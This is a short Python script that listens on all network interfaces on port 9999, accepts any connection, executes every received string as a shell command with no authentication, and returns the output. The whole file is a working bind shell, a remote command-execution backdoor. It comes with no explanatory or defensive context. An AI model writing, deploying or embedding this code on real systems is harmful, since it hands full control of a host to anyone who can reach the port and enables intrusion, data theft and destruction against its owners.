import socket
import subprocess
import os
import threading

def handle_client(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            if command:
                # Execute the command
                output = subprocess.getoutput(command)
                client_socket.send(output.encode('utf-8'))
        except Exception as e:
            print(f"Error: {e}")
            break
    client_socket.close()

def server_program():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  
    server.listen(5)
    print("Listening on port 9999...")
    
    while True:
        client_socket, addr = server.accept()
        print(f"Accepted connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == '__main__':
    server_program()
